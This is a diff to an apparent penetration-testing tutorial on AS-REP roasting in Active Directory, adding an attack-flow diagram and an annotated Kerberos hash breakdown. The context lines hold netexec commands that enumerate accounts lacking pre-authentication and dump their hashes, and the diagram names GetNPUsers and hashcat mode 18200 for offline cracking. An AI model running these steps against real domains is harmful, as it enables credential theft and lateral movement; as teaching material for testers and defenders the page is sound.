@@ -34,6 +34,23 @@ Roastable user: AS-REQ ──► KDC ──► AS-REP { enc-part encrypted with 
 
 Hash format is `$krb5asrep$23$user@REALM:<checksum>$<cipher>` where `23` = RC4-HMAC (etype 23), the fast-to-crack variant.
 
+<div class="attack-diagram">
+  <div class="diag-title">AS-REP Roasting — passwordless credential access</div>
+  <div class="diag-flow">
+    <div class="diag-node start"><span class="n-step">STEP 1</span><span class="n-title">Username list</span><span class="n-tool">no creds needed</span></div>
+    <div class="diag-arrow">&rarr;</div>
+    <div class="diag-node"><span class="n-step">STEP 2</span><span class="n-title">Ask KDC (no pre-auth)</span><span class="n-tool">GetNPUsers -no-pass</span></div>
+    <div class="diag-arrow">&rarr;</div>
+    <div class="diag-node"><span class="n-step">STEP 3</span><span class="n-title">AS-REP hash</span><span class="n-tool">$krb5asrep$23$</span></div>
+    <div class="diag-arrow">&rarr;</div>
+    <div class="diag-node"><span class="n-step">STEP 4</span><span class="n-title">Crack offline</span><span class="n-tool">hashcat -m 18200</span></div>
+    <div class="diag-arrow">&rarr;</div>
+    <div class="diag-node"><span class="n-step">STEP 5</span><span class="n-title">Plaintext password</span><span class="n-tool">svc_sql</span></div>
+    <div class="diag-arrow">&rarr;</div>
+    <div class="diag-node win"><span class="n-step">STEP 6</span><span class="n-title">Authenticated</span><span class="n-tool">enumerate + pivot</span></div>
+  </div>
+</div>
+
 ## Step-by-step
 
 ### 1. Unauthenticated — spray a userlist
@@ -70,11 +87,16 @@ nxc ldap $DC -u m.rossi -p 'Welcome2026!' --asreproast asrep_hashes.txt
 nxc ldap $DC -u m.rossi -p 'Welcome2026!' --query "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" "sAMAccountName"
 ```
 
-<div class="img-placeholder">
-  <span class="ph-icon">🖼️</span>
-  <span class="ph-label">SCREENSHOT PLACEHOLDER</span>
-  <span class="ph-desc">GetNPUsers output showing the $krb5asrep$23$ hash captured</span>
-</div>
+Anatomy of the captured AS-REP hash (hashcat mode 18200):
+
+```terminal
+$krb5asrep$23$svc_sql@CORP.LOCAL:1a2b3c...ff00
+     |        |   |               |
+     |        |   |               +-- enc-part: encrypted with svc_sql's password-derived key (crack this)
+     |        |   +----- principal @ REALM
+     |        +--------- etype 23 = RC4-HMAC  (fast; 17/18 = AES, much slower)
+     +------------------ AS-REP roast marker
+```
 
 ### 4. Crack offline with Hashcat
 
